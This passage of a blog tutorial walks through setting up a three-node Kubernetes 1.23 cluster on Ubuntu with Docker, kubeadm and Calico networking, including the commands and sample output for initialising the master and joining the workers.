class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo ufw <span class=\"built_in\">disable</span></span><br><span class=\"line\">Firewall stopped and disabled on system startup</span><br><span class=\"line\"></span><br><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo ufw status</span><br><span class=\"line\">Status: inactive</span><br></pre></td></tr></table></figure>\n<h3 id=\"installing-docker-engine\"><a class=\"markdownIt-Anchor\" href=\"#installing-docker-engine\">#</a> Installing Docker Engine</h3>\n<p>Kubernetes requires you to install a container runtime to work correctly.There are many available options like containerd, CRI-O, Docker etc</p>\n<p>By default, Kubernetes uses the Container Runtime Interface (CRI) to interface with your chosen container runtime.If you don’t specify a runtime, kubeadm automatically tries to detect an installed container runtime by scanning through a list of known endpoints.</p>\n<p>You must install the Docker Engine on each node!</p>\n<h4 id=\"1-set-up-the-repository\"><a class=\"markdownIt-Anchor\" href=\"#1-set-up-the-repository\">#</a> 1- Set up the repository</h4>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo apt update</span><br><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo apt install ca-certificates curl gnupg lsb-release</span><br></pre></td></tr></table></figure>\n<h4 id=\"2-add-dockers-official-gpg-key\"><a class=\"markdownIt-Anchor\" href=\"#2-add-dockers-official-gpg-key\">#</a> 2- Add Docker’s official GPG key</h4>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo <span class=\"built_in\">mkdir</span> -p /etc/apt/keyrings</span><br><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg</span><br></pre></td></tr></table></figure>\n<h4 id=\"3-add-the-stable-repository-using-the-following-command\"><a class=\"markdownIt-Anchor\" href=\"#3-add-the-stable-repository-using-the-following-command\">#</a> 3- Add the stable repository using the following command:</h4>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ <span class=\"built_in\">echo</span> \\</span><br><span class=\"line\">  <span class=\"string\">&quot;deb [arch=<span class=\"subst\">$(dpkg --print-architecture)</span> signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \\</span></span><br><span class=\"line\"><span class=\"string\">  <span class=\"subst\">$(lsb_release -cs)</span> stable&quot;</span> | sudo <span class=\"built_in\">tee</span> /etc/apt/sources.list.d/docker.list &gt; /dev/null</span><br></pre></td></tr></table></figure>\n<h4 id=\"4-install-the-docker-container\"><a class=\"markdownIt-Anchor\" href=\"#4-install-the-docker-container\">#</a> 4- Install the docker container</h4>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo apt update &amp;&amp; sudo apt install docker-ce docker-ce-cli containerd.io -y</span><br></pre></td></tr></table></figure>\n<h4 id=\"5-make-sure-that-the-docker-will-work-on-system-startup\"><a class=\"markdownIt-Anchor\" href=\"#5-make-sure-that-the-docker-will-work-on-system-startup\">#</a> 5- Make sure that the docker will work on system startup</h4>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo systemctl <span class=\"built_in\">enable</span> --now docker </span><br></pre></td></tr></table></figure>\n<h4 id=\"6-configuring-cgroup-driver\"><a class=\"markdownIt-Anchor\" href=\"#6-configuring-cgroup-driver\">#</a> 6- Configuring Cgroup Driver:</h4>\n<p>The Cgroup Driver must be configured to let the kubelet process work correctly</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ <span class=\"built_in\">cat</span> &lt;&lt;<span class=\"string\">EOF | sudo tee /etc/docker/daemon.json</span></span><br><span class=\"line\"><span class=\"string\">&#123;</span></span><br><span class=\"line\"><span class=\"string\">  &quot;exec-opts&quot;: [&quot;native.cgroupdriver=systemd&quot;],</span></span><br><span class=\"line\"><span class=\"string\">  &quot;log-driver&quot;: &quot;json-file&quot;,</span></span><br><span class=\"line\"><span class=\"string\">  &quot;log-opts&quot;: &#123;</span></span><br><span class=\"line\"><span class=\"string\">    &quot;max-size&quot;: &quot;100m&quot;</span></span><br><span class=\"line\"><span class=\"string\">  &#125;,</span></span><br><span class=\"line\"><span class=\"string\">  &quot;storage-driver&quot;: &quot;overlay2&quot;</span></span><br><span class=\"line\"><span class=\"string\">&#125;</span></span><br><span class=\"line\"><span class=\"string\">EOF</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"7-restart-the-docker-service-to-make-sure-the-new-configuration-is-applied\"><a class=\"markdownIt-Anchor\" href=\"#7-restart-the-docker-service-to-make-sure-the-new-configuration-is-applied\">#</a> 7- Restart the docker service to make sure the new configuration is applied</h4>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo systemctl daemon-reload &amp;&amp; sudo systemctl restart docker</span><br></pre></td></tr></table></figure>\n<h3 id=\"installing-kubernetes-kubeadm-kubelet-and-kubectl\"><a class=\"markdownIt-Anchor\" href=\"#installing-kubernetes-kubeadm-kubelet-and-kubectl\">#</a> Installing kubernetes (kubeadm, kubelet, and kubectl):</h3>\n<p>Install the following dependency required by Kubernetes on each node</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo apt install apt-transport-https</span><br></pre></td></tr></table></figure>\n<h4 id=\"download-the-google-cloud-public-signing-key\"><a class=\"markdownIt-Anchor\" href=\"#download-the-google-cloud-public-signing-key\">#</a> Download the Google Cloud public signing key:</h4>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo curl -fsSLo /usr/share/keyrings/kubernetes-archive-keyring.gpg https://packages.cloud.google.com/apt/doc/apt-key.gpg</span><br></pre></td></tr></table></figure>\n<h4 id=\"add-the-kubernetes-apt-repository\"><a class=\"markdownIt-Anchor\" href=\"#add-the-kubernetes-apt-repository\">#</a> Add the Kubernetes apt repository:</h4>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ <span class=\"built_in\">echo</span> <span class=\"string\">&quot;deb [signed-by=/usr/share/keyrings/kubernetes-archive-keyring.gpg] https://apt.kubernetes.io/ kubernetes-xenial main&quot;</span> | sudo <span class=\"built_in\">tee</span> /etc/apt/sources.list.d/kubernetes.list</span><br></pre></td></tr></table></figure>\n<h4 id=\"update-the-apt-package-index-and-install-kubeadm-kubelet-and-kubeclt\"><a class=\"markdownIt-Anchor\" href=\"#update-the-apt-package-index-and-install-kubeadm-kubelet-and-kubeclt\">#</a> Update the apt package index and install kubeadm, kubelet, and kubeclt</h4>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo apt update &amp;&amp; sudo apt install -y kubelet=1.23.1-00 kubectl=1.23.1-00 kubeadm=1.23.1-00</span><br></pre></td></tr></table></figure>\n<h2 id=\"initializing-the-control-plane-node\"><a class=\"markdownIt-Anchor\" href=\"#initializing-the-control-plane-node\">#</a> Initializing the control-plane node</h2>\n<p>At this point, we have 3 nodes with docker,  <code>kubeadm</code> ,  <code>kubelet</code> , and  <code>kubectl</code>  installed. Now we must initialize the Kubernetes master, which will manage the whole cluster and the pods running within the cluster  <code>kubeadm init</code>  by specifiy the address of the master node and the ipv4 address pool of the pods</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo kubeadm init --apiserver-advertise-address=192.168.1.18 --pod-network-cidr=10.1.0.0/16</span><br></pre></td></tr></table></figure>\n<p>You should wait a few minutes until the initialization is completed. The first initialization will take a lot of time if your connexion speed is slow (pull the images of the cluster components)</p>\n<h3 id=\"configuring-kubectl\"><a class=\"markdownIt-Anchor\" href=\"#configuring-kubectl\">#</a> Configuring kubectl</h3>\n<p>As known, the  <code>kubectl</code>  is a command line tool for performing actions on your cluster. So we must to configure  <code>kubectl</code> . Run the following command from your master node:</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ <span class=\"built_in\">mkdir</span> -p <span class=\"variable\">$HOME</span>/.kube</span><br><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo <span class=\"built_in\">cp</span> -i /etc/kubernetes/admin.conf <span class=\"variable\">$HOME</span>/.kube/config</span><br><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo <span class=\"built_in\">chown</span> $(<span class=\"built_in\">id</span> -u):$(<span class=\"built_in\">id</span> -g) <span class=\"variable\">$HOME</span>/.kube/config</span><br></pre></td></tr></table></figure>\n<h3 id=\"installing-calico-cni\"><a class=\"markdownIt-Anchor\" href=\"#installing-calico-cni\">#</a> Installing Calico CNI</h3>\n<p>Calico provides network and network security solutions for containers. Calico is best known for its performance, flexibility and power. Use-cases: Calico can be used within a lot of Kubernetes platforms (kops, Kubespray, docker enterprise, etc.) to block or allow traffic between pods, namespaces</p>\n<h4 id=\"1-install-tigera-calico-operator\"><a class=\"markdownIt-Anchor\" href=\"#1-install-tigera-calico-operator\">#</a> 1- Install Tigera Calico operator</h4>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ kubectl create -f <span class=\"string\">&quot;https://projectcalico.docs.tigera.io/manifests/tigera-operator.yaml&quot;</span></span><br></pre></td></tr></table></figure>\n<p>The Tigera Operator is a Kubernetes operator which manages the lifecycle of a Calico or Calico Enterprise installation on Kubernetes. Its goal is to make installation, upgrades, and ongoing lifecycle management of Calico and Calico Enterprise as simple and reliable as possible.</p>\n<h4 id=\"2-download-the-custom-resourcesyaml-manifest-and-change-it\"><a class=\"markdownIt-Anchor\" href=\"#2-download-the-custom-resourcesyaml-manifest-and-change-it\">#</a> 2- Download the custom-resources.yaml manifest and change it</h4>\n<p>The Calico has a default pod’s CIDR value. But in our example, we set the   <code>--pod-netwokr-cidr=10.1.0.0/16</code> . So we must change the value of pod network CIDR in  <code>custom-resources.yaml</code></p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ wget  <span class=\"string\">&quot;https://projectcalico.docs.tigera.io/manifests/custom-resources.yaml&quot;</span></span><br></pre></td></tr></table></figure>\n<p>Now we edit this file before create the Calico pods</p>\n<figure class=\"highlight yml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># This section includes base Calico installation configuration.</span></span><br><span class=\"line\"><span class=\"comment\"># For more information, see: https://projectcalico.docs.tigera.io/v3.23/reference/installation/api#operator.tigera.io/v1.Installation</span></span><br><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">operator.tigera.io/v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Installation</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">default</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\">  <span class=\"comment\"># Configures Calico networking.</span></span><br><span class=\"line\">  <span class=\"attr\">calicoNetwork:</span></span><br><span class=\"line\">    <span class=\"comment\"># <span class=\"doctag\">Note:</span> The ipPools section cannot be modified post-install.</span></span><br><span class=\"line\">    <span class=\"attr\">ipPools:</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">blockSize:</span> <span class=\"number\">26</span></span><br><span class=\"line\">      <span class=\"attr\">cidr:</span> <span class=\"number\">10.1</span><span class=\"number\">.0</span><span class=\"number\">.0</span><span class=\"string\">/16</span> <span class=\"comment\">#change this value with yours</span></span><br><span class=\"line\">      <span class=\"attr\">encapsulation:</span> <span class=\"string\">VXLANCrossSubnet</span></span><br><span class=\"line\">      <span class=\"attr\">natOutgoing:</span> <span class=\"string\">Enabled</span></span><br><span class=\"line\">      <span class=\"attr\">nodeSelector:</span> <span class=\"string\">all()</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">---</span></span><br><span class=\"line\"><span class=\"meta\"></span></span><br><span class=\"line\"><span class=\"comment\"># This section configures the Calico API server.</span></span><br><span class=\"line\"><span class=\"comment\"># For more information, see: https://projectcalico.docs.tigera.io/v3.23/reference/installation/api#operator.tigera.io/v1.APIServer</span></span><br><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">operator.tigera.io/v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">APIServer</span> </span><br><span class=\"line\"><span class=\"attr\">metadata:</span> </span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">default</span> </span><br><span class=\"line\"><span class=\"attr\">spec:</span> &#123;&#125;</span><br></pre></td></tr></table></figure>\n<p>After Editing the  <code>custom-resources.yaml</code>  file. Run the following command:</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ kubectl create -f <span class=\"string\">&quot;custom-resources.yaml&quot;</span> </span><br></pre></td></tr></table></figure>\n<p>Before you can use the cluster, you must wait for the pods required by Calico to be downloaded. You must wait until you find all the pods running and ready!</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ kubectl get pods --all-namespaces</span><br><span class=\"line\">NAMESPACE          NAME                                       READY   STATUS    RESTARTS       AGE</span><br><span class=\"line\">calico-apiserver   calico-apiserver-5989576d6d-5nw7n          1/1     Running   1 (4min ago)    4min</span><br><span class=\"line\">calico-apiserver   calico-apiserver-5989576d6d-h677h          1/1     Running   1 (4min ago)    4min</span><br><span class=\"line\">calico-system      calico-kube-controllers-69cfd64db4-9hnh5   1/1     Running   1 (4min ago)    4min</span><br><span class=\"line\">calico-system      calico-node-lshdl                          1/1     Running   1 (4min ago)    4min</span><br><span class=\"line\">calico-system      calico-typha-76dd7c96d7-88826              1/1     Running   1 (4min ago)    4min</span><br><span class=\"line\">kube-system        coredns-64897985d-jkpwh                    1/1     Running   1 (4min ago)    4min</span><br><span class=\"line\">kube-system        coredns-64897985d-zk9wx                    1/1     Running   1 (4min ago)    4min</span><br><span class=\"line\">kube-system        etcd-master                                1/1     Running   1 (4min ago)    4min</span><br><span class=\"line\">kube-system        kube-apiserver-master                      1/1     Running   1 (4min ago)    4min</span><br><span class=\"line\">kube-system        kube-controller-manager-master             1/1     Running   1 (4min ago)    4min</span><br><span class=\"line\">kube-system        kube-proxy-4nf4q                           1/1     Running   1 (4min ago)    4min</span><br><span class=\"line\">kube-system        kube-scheduler-master                      1/1     Running   1 (4min ago)    4min</span><br><span class=\"line\">tigera-operator    tigera-operator-7d8c9d4f67-j5b2g           1/1     Running   2 (103s ago)    4min</span><br></pre></td></tr></table></figure>\n<h2 id=\"join-the-worker-nodes\"><a class=\"markdownIt-Anchor\" href=\"#join-the-worker-nodes\">#</a> Join the worker nodes</h2>\n<p>Now our cluster is ready to work! let’s join the worker nodes to this cluster by getting the token from the master node</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ sudo kubeadm token create --print-join-command</span><br><span class=\"line\">kubeadm <span class=\"built_in\">join</span> 192.168.1.18:6443 --token g4mgtb.e8zgs1c0kpkaj9wt --discovery-token-ca-cert-hash sha256:047628de2a0a43127b7c4774093203631d315451874efc6b63421a4da9bee2ec</span><br></pre></td></tr></table></figure>\n<p>Now let’s move to the worker node and run the following command given by  <code>kubeadm token create</code></p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-worker1:~$ sudo kubeadm <span class=\"built_in\">join</span> 192.168.1.18:6443 --token g4mgtb.e8zgs1c0kpkaj9wt </span><br><span class=\"line\">\\--discovery-token-ca-cert-hash sha256:047628de2a0a43127b7c4774093203631d315451874efc6b63421a4da9bee2ec</span><br></pre></td></tr></table></figure>\n<p>The output must be similar to the following</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[preflight] Running pre-flight checks</span><br><span class=\"line\">[preflight] Reading configuration from the cluster...</span><br><span class=\"line\">[preflight] FYI: You can look at this config file with <span class=\"string\">&#x27;kubectl -n kube-system get cm kubeadm-config -o yaml&#x27;</span></span><br><span class=\"line\">W0623 12:45:07.940655   23651 utils.go:69] The recommended value <span class=\"keyword\">for</span> <span class=\"string\">&quot;resolvConf&quot;</span> <span class=\"keyword\">in</span> <span class=\"string\">&quot;KubeletConfiguration&quot;</span> is: /run/systemd/resolve/resolv.conf; the provided value is: /run/systemd/resolve/resolv.conf</span><br><span class=\"line\">[kubelet-start] Writing kubelet configuration to file <span class=\"string\">&quot;/var/lib/kubelet/config.yaml&quot;</span></span><br><span class=\"line\">[kubelet-start] Writing kubelet environment file with flags to file <span class=\"string\">&quot;/var/lib/kubelet/kubeadm-flags.env&quot;</span></span><br><span class=\"line\">[kubelet-start] Starting the kubelet</span><br><span class=\"line\">[kubelet-start] Waiting <span class=\"keyword\">for</span> the kubelet to perform the TLS Bootstrap...</span><br><span class=\"line\"></span><br><span class=\"line\">This node has joined the cluster:</span><br><span class=\"line\">* Certificate signing request was sent to apiserver and a response was received.</span><br><span class=\"line\">* The Kubelet was informed of the new secure connection details.</span><br><span class=\"line\"></span><br><span class=\"line\">Run <span class=\"string\">&#x27;kubectl get nodes&#x27;</span> on the control-plane to see this node <span class=\"built_in\">join</span> the cluster.</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>Now let’s Check the cluster by running  <code>kubectl get nodes</code>  command on the master node.</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ kubectl get nodes</span><br><span class=\"line\"></span><br><span class=\"line\">NAME              STATUS     ROLES                  AGE    VERSION</span><br><span class=\"line\">4n6nk8s-master    Ready      control-plane,master   40m5s  v1.23.1</span><br><span class=\"line\">4n6nk8s-worker1   Ready      &lt;none&gt;                 3m7s   v1.23.1</span><br><span class=\"line\">4n6nk8s-worker2   Ready      &lt;none&gt;                 2m3s   v1.23.1</span><br></pre></td></tr></table></figure>\n<h2 id=\"references\"><a class=\"markdownIt-Anchor\" href=\"#references\">#</a> References:</h2>\n<div class=\"links\"><div class=\"item\" title=\"Kubernetes Documentation\" style=\"--block-color:#2296fd;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9rdWJlcm5ldGVzLmlvL2RvY3Mvc2V0dXAvcHJvZHVjdGlvbi1lbnZpcm9ubWVudC90b29scy9rdWJlYWRtL2NyZWF0ZS1jbHVzdGVyLWt1YmVhZG0v\" data-background-image=\"https://upload.wikimedia.org/wikipedia/commons/thumb/3/39/Kubernetes_logo_without_workmark.svg/1200px-Kubernetes_logo_without_workmark.svg.png\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9rdWJlcm5ldGVzLmlvL2RvY3Mvc2V0dXAvcHJvZHVjdGlvbi1lbnZpcm9ubWVudC90b29scy9rdWJlYWRtL2NyZWF0ZS1jbHVzdGVyLWt1YmVhZG0v\">Kubernetes Documentation</span>\n          <p class=\"desc\">Creating a cluster with kubeadm</p>\n          </div></div><div class=\"item\" title=\"Calico Documentation\" style=\"--block-color:#FB7031;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9wcm9qZWN0Y2FsaWNvLmRvY3MudGlnZXJhLmlvL2dldHRpbmctc3RhcnRlZC9rdWJlcm5ldGVzL3NlbGYtbWFuYWdlZC1vbnByZW0vb25wcmVtaXNlcw==\" data-background-image=\"https://projectcalico.docs.tigera.io/images/favicon.png\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9wcm9qZWN0Y2FsaWNvLmRvY3MudGlnZXJhLmlvL2dldHRpbmctc3RhcnRlZC9rdWJlcm5ldGVzL3NlbGYtbWFuYWdlZC1vbnByZW0vb25wcmVtaXNlcw==\">Calico Documentation</span>\n          <p class=\"desc\">Install Calico Networking for on-premises deployments</p>\n          </div></div><div class=\"item\" title=\"Docker Documentation\" style=\"--block-color:#31bffb;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9kb2NzLmRvY2tlci5jb20vZW5naW5lL2luc3RhbGwvdWJ1bnR1Lw==\" data-background-image=\"https://www.docker.com/wp-content/uploads/2022/05/Docker_Temporary_Image_Google_Blue_1080x1080_v1.png\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9kb2NzLmRvY2tlci5jb20vZW5naW5lL2luc3RhbGwvdWJ1bnR1Lw==\">Docker Documentation</span>\n          <p class=\"desc\">Install Docker Engine on Ubuntu</p>\n          </div></div></div>\n",
            "tags": []
        }
    ]
}